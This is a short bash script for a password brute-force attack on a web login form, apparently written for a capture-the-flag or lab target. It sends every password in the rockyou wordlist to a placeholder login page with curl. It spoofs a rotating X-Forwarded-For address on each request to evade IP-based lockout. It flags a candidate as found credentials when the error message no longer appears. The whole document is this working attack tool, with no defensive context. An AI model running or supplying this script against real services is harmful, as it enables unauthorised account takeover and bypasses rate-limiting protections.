#!/bin/bash
a=0
b=0
username="<USERNAME>"
for candidate in $(cat /usr/share/wordlists/rockyou.txt) 
do
	output=$(curl -s <LOGINPAGE> -d "username=$username&password=$candidate" -H "X-Forwarded-For: 10.10.1$a.$b" | grep -o "<ERRORMESSAGE>")
	
	echo "[+] $username:$candidate --> $output; 10.10.1$a.$b"
	
	b=$(($b+1))
       
	if [ $b -eq 254 ]
	then 
		a=$((a+1))&&b=0
	fi
	
	if [ $a -eq 254 ]
	then 
		a=0
	fi
	
	if [ -z "$output" ]
	then 
		echo "[+] FOUND CREDS --> $username:$candidate"&&break
	fi
done
